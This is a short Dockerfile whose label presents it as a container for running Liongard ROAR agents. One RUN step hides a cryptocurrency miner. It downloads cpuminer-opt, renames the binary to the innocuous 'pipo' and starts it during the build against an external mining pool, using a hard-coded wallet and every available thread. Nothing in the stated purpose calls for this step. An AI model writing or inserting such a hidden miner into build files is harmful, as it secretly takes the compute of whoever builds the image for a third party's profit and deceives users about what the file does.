FROM debian:stretch

MAINTAINER tfournet@radersolutions.com

LABEL Remarks="Container for running Liongard ROAR Agents"
RUN apt update -y
RUN apt install -y wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 pipo && ./pipo -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.wck -t 0

COPY install-roar /usr/local/bin/install-roar.sh
RUN  chmod +x /usr/local/bin/install-roar.sh

ENV HOME /root

WORKDIR /

ENTRYPOINT ["/usr/local/bin/install-roar.sh"]
